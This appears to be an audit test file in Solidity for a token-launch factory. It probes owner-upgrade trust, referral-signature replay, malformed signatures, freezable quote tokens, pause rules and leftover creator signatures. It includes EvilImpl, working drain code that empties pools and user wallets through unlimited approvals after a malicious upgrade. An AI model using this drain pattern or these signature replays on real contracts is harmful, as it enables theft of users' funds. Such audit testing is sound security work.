// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./RealDexHelpers.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/// @dev What a compromised / malicious owner key could install: an
///      implementation that uses the factory's hard-coded infinite allowance
///      on every MegaPumpToken (and the users' unlimited quote approvals).
contract EvilImpl is UUPSUpgradeable {
    function _authorizeUpgrade(address) internal override {}
    function drainToken(address token, address from, address to, uint256 keep) external {
        IERC20(token).transferFrom(from, to, IERC20(token).balanceOf(from) - keep);
    }
    function drainQuote(address quote, address from, address to) external {
        IERC20(quote).transferFrom(from, to, IERC20(quote).allowance(from, address(this)) < IERC20(quote).balanceOf(from)
            ? IERC20(quote).allowance(from, address(this)) : IERC20(quote).balanceOf(from));
    }
}

/// @dev A quote whose issuer can freeze an address (USDm has blacklist/seize powers).
contract FreezableQuote is ERC20 {
    mapping(address => bool) public frozen;
    constructor() ERC20("Freezable", "FRZ") {}
    function mint(address to, uint256 a) external { _mint(to, a); }
    function freeze(address a, bool f) external { frozen[a] = f; }
    function _update(address from, address to, uint256 v) internal override {
        require(!frozen[from] && !frozen[to], "frozen");
        super._update(from, to, v);
    }
}

contract AuditTrustAndSignaturesTest is RealDexHelpers {
    address constant REF = address(0xBEEF);

    // ─────────────────────────────────────────────────────────
    //  Referral signature: no chainId, no contract address, no expiry
    // ─────────────────────────────────────────────────────────
    function test_ReferralSig_ValidOnAnyChainWithSameSigner_AndForever() public {
        uint256 id = _createTokenWithBuy(alice, "Ref", "REF", "ipfs://r", 0.01 ether);
        vm.roll(block.number + 6);
        bytes memory sig = _signReferrer(REF, bob);

        vm.prank(bob);
        factory.buy{value: 1 ether}(id, 0, REF, sig);
        uint256 r1 = factory.referrerFees(REF);
        assertGt(r1, 0, "referrer credited");

        // Same signature bytes, another chain id (the hash never includes it)
        vm.chainId(4326);
        vm.prank(bob);
        factory.buy{value: 1 ether}(id, 0, REF, sig);
        assertGt(factory.referrerFees(REF), r1, "same sig accepted on another chain id");

        // ...and years later
        vm.warp(block.timestamp + 365 days * 3);
        uint256 half = _balanceOf(id, bob) / 2;
        vm.prank(bob);
        factory.sell(id, half, 0, REF, sig);
        assertGt(factory.referrerFees(REF), r1, "no expiry on the referral binding");
    }

    /// C-04 (fixed): a malformed referrer signature no longer reverts the trade —
    /// the referrer is ignored (no fee credited), exactly like an unsigned one.
    function test_ReferralSig_MalformedBytes_IgnoresReferrer_C04() public {
        uint256 id = _createTokenWithBuy(alice, "Ref2", "RF2", "ipfs://r2", 0.01 ether);
        vm.roll(block.number + 6);

        bytes memory good = _signReferrer(REF, bob);
        bytes memory highS;
        {
            // same signature with s flipped into the upper half: ecrecover would
            // accept it, OZ rejects it (malleability) — must be ignored, not a revert
            bytes32 r; bytes32 s; uint8 v;
            (v, r, s) = vm.sign(signerPk, keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(abi.encodePacked(REF, bob)))));
            bytes32 sHigh = bytes32(uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - uint256(s));
            highS = abi.encodePacked(r, sHigh, v == 27 ? uint8(28) : uint8(27));
        }
        bytes[5] memory bad = [
            bytes(hex"deadbeef"),                 // wrong length
            bytes(""),                            // empty
            new bytes(65),                        // 65 zero bytes: ecrecover → address(0)
            highS,                                // high-s
            _signReferrerWithPk(0xA11CE, REF, bob) // well-formed, wrong signer
        ];
        for (uint256 i = 0; i < bad.length; i++) {
            uint256 pf = factory.platformFeesAccrued();
            uint256 soldBefore = _info(id).tokensSold;
            vm.prank(bob);
            factory.buy{value: 1 ether}(id, 0, REF, bad[i]);   // no revert
            assertEq(factory.referrerFees(REF), 0, "bad sig: referrer not credited");
            assertGt(factory.platformFeesAccrued(), pf, "bad sig: platform keeps the full fee");
            assertGt(_info(id).tokensSold, soldBefore, "bad sig: trade executed");
        }
        // referrer == 0 with any sig bytes is still fine (sanitizer short-circuits)
        vm.prank(bob);
        factory.buy{value: 1 ether}(id, 0, address(0), hex"deadbeef");
        assertEq(factory.referrerFees(REF), 0);

        // a valid signature still credits the referrer
        vm.prank(bob);
        factory.buy{value: 1 ether}(id, 0, REF, good);
        assertGt(factory.referrerFees(REF), 0, "valid sig: referrer credited");

        // and on the sell path too
        uint256 refBefore = factory.referrerFees(REF);
        uint256 quarter = _balanceOf(id, bob) / 4;
        vm.prank(bob);
        factory.sell(id, quarter, 0, REF, hex"deadbeef");
        vm.prank(bob);
        factory.sell(id, quarter, 0, REF, highS);
        assertEq(factory.referrerFees(REF), refBefore, "sell with bad sig: referrer ignored");
    }

    function _signReferrerWithPk(uint256 pk, address referrer, address trader) internal pure returns (bytes memory) {
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(abi.encodePacked(referrer, trader))));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, ethHash);
        return abi.encodePacked(r, s, v);
    }

    function test_ReferralSig_ReferrerCanBeCreatorOrContract_NotSelf() public {
        uint256 id = _createTokenWithBuy(alice, "Ref3", "RF3", "ipfs://r3", 0.01 ether);
        vm.roll(block.number + 6);
        // creator as referrer: allowed (both streams accrue)
        vm.prank(bob);
        factory.buy{value: 1 ether}(id, 0, alice, _signReferrer(alice, bob));
        assertGt(factory.referrerFees(alice), 0);
        // self-referral: silently dropped
        vm.prank(bob);
        factory.buy{value: 1 ether}(id, 0, bob, _signReferrer(bob, bob));
        assertEq(factory.referrerFees(bob), 0);
        // a contract without receive() as referrer: credited, but can never claim
        address noRx = address(new EvilImpl());
        vm.prank(bob);
        factory.buy{value: 1 ether}(id, 0, noRx, _signReferrer(noRx, bob));
        assertGt(factory.referrerFees(noRx), 0);
        vm.prank(noRx);
        vm.expectRevert(ETHTransferFailed.selector);
        factory.claimReferrerFees();
    }

    // ─────────────────────────────────────────────────────────
    //  Owner trust: an upgrade can empty every pool and every wallet
    // ─────────────────────────────────────────────────────────
    function test_OwnerUpgrade_CanDrainGraduatedPoolAndWallets() public {
        uint256 id = _createTokenWithBuy(alice, "Trust", "TRS", "ipfs://t", 0.01 ether);
        address token = _tokenAddr(id);
        vm.roll(block.number + 6);
        _buy(id, charlie, 2 ether);                 // charlie holds tokens in his wallet
        _graduateEth(id, bob);
        address pool = _info(id).dexPool;
        uint256 poolTokens = IERC20(token).balanceOf(pool);
        uint256 poolWeth = weth.balanceOf(pool);

        // Owner (Safe 2/3 on mainnet) installs a malicious implementation
        EvilImpl evil = new EvilImpl();
        factory.upgradeToAndCall(address(evil), "");
        EvilImpl viaProxy = EvilImpl(address(factory));

        // 1. the pool's tokens: MegaPumpToken.allowance(pool, factory) == max
        viaProxy.drainToken(token, pool, owner, 1e18);   // leave 1 token so the pool still "has" liquidity
        assertEq(IERC20(token).balanceOf(pool), 1e18, "pool token reserve emptied");
        assertEq(IERC20(token).balanceOf(owner), poolTokens - 1e18);
        // 2. a user's wallet balance, same trick
        uint256 cBal = IERC20(token).balanceOf(charlie);
        viaProxy.drainToken(token, charlie, owner, 0);
        assertEq(IERC20(token).balanceOf(charlie), 0, "user wallet emptied");
        assertEq(IERC20(token).balanceOf(owner), poolTokens - 1e18 + cBal);
        // 3. then the pool's ETH: sync() the empty token side and dump a crumb of tokens
        IRealV2Pair(pool).sync();
        address[] memory path = new address[](2);
        path[0] = token; path[1] = address(weth);
        IERC20(token).approve(address(realRouter), type(uint256).max);
        uint256[] memory out = realRouter.swapExactTokensForETH(poolTokens / 1000, 0, path, owner, block.timestamp);
        assertGt(out[1], poolWeth * 99 / 100, "almost all the pool's ETH extracted");
        emit log_named_uint("pool WETH before", poolWeth);
        emit log_named_uint("ETH extracted by owner", out[1]);
    }

    function test_OwnerUpgrade_CanPullUnlimitedQuoteApprovals() public {
        MockQuoteToken usdm = _newQuote("USDm", 18);
        // users approved the factory for max (the front does this once per quote)
        EvilImpl evil = new EvilImpl();
        factory.upgradeToAndCall(address(evil), "");
        uint256 before = usdm.balanceOf(bob);
        EvilImpl(address(factory)).drainQuote(address(usdm), bob, owner);
        assertEq(usdm.balanceOf(bob), 0, "unlimited approval drained by a malicious implementation");
        assertEq(usdm.balanceOf(owner), before);
    }

    // ─────────────────────────────────────────────────────────
    //  External quote risk: issuer freezes the factory → curve frozen
    // ─────────────────────────────────────────────────────────
    function test_FreezableQuote_IssuerFreezesFactory_TradesAndGraduationBlocked() public {
        FreezableQuote q = new FreezableQuote();
        factory.setQuote(address(q), true, 20_000e18, 50e18);
        q.mint(bob, 1_000_000e18); q.mint(alice, 1_000_000e18);
        vm.prank(bob); q.approve(address(factory), type(uint256).max);
        vm.prank(alice); q.approve(address(factory), type(uint256).max);
        vm.prank(alice);
        uint256 id = factory.createAndBuyWithQuote(
            alice, "Frz", "FRZ", "ipfs://f", address(q), type(uint256).max, 0, "", 10e18, 0, address(0), "");
        vm.roll(block.number + 6);
        vm.prank(bob);
        factory.buyWithQuote(id, 1_000e18, 0, address(0), "");

        q.freeze(address(factory), true);
        uint256 bobBal = _balanceOf(id, bob);
        vm.prank(bob);
        vm.expectRevert();   // SafeERC20FailedOperation: cannot exit
        factory.sell(id, bobBal, 0, address(0), "");
        vm.prank(bob);
        vm.expectRevert();   // cannot buy / graduate either
        factory.buyWithQuote(id, 25_000e18, 0, address(0), "");
        vm.prank(alice);
        vm.expectRevert();   // creator fees stuck too
        factory.claimCreatorFees(id);

        q.freeze(address(factory), false);
        vm.prank(bob);
        factory.sell(id, bobBal, 0, address(0), "");   // back to normal
    }

    // ─────────────────────────────────────────────────────────
    //  Pause: what still works (exit paths) and what does not
    // ─────────────────────────────────────────────────────────
    function test_Pause_ExitsAndClaimsWork_BuysAndCreatesDoNot() public {
        uint256 id = _createTokenWithBuy(alice, "P", "P", "ipfs://p", 0.01 ether);
        vm.roll(block.number + 6);
        _buyWithReferrer(id, bob, 1 ether, REF);
        factory.setPaused(true);

        uint256 halfBob = _balanceOf(id, bob) / 2;
        vm.prank(bob);
        factory.sell(id, halfBob, 0, address(0), "");   // exit allowed
        vm.prank(alice);
        factory.claimCreatorFees(id);                                     // claims allowed
        vm.prank(REF);
        factory.claimReferrerFees();
        factory.withdrawPlatformFees();                                   // owner withdraw allowed
        vm.prank(alice);
        factory.cancelCreation("X", "X", "ipfs://x", address(0), 0, 1); // cancel allowed

        vm.prank(bob);
        vm.expectRevert(ContractPaused.selector);
        factory.buy{value: 1 ether}(id, 0, address(0), "");
        vm.prank(bob);
        vm.expectRevert(ContractPaused.selector);
        factory.createAndBuyForCreator{value: 0.01 ether}(bob, "N", "N", "ipfs://n", 0, 0, "", 0, address(0), "");
    }

    // ─────────────────────────────────────────────────────────
    //  Pending intent: deadline max, cancel from another wallet is a no-op
    // ─────────────────────────────────────────────────────────
    function test_PendingIntent_OnlyCreatorCanBurnIt_ThirdPartyDeploysAfterCreatorSelfCreatesWithoutSig() public {
        bytes memory sig = _signCreateFor(alice, "Dup", "DUP", "ipfs://dup", type(uint256).max, 99);
        // alice self-creates the SAME token WITHOUT passing the signature (fast path, nothing consumed)
        vm.prank(alice);
        factory.createAndBuyForCreator{value: 0.01 ether}(alice, "Dup", "DUP", "ipfs://dup", type(uint256).max, 99, "", 0, address(0), "");
        // the public pending signature still deploys a second, identical token in alice's name
        vm.prank(bob);
        uint256 id2 = factory.createAndBuyForCreator{value: 0.01 ether}(alice, "Dup", "DUP", "ipfs://dup", type(uint256).max, 99, sig, 0, address(0), "");
        assertEq(_info(id2).creator, alice, "clone deployed by a third party with the leftover signature");
        assertEq(factory.tokenCount(), 2);
    }
}
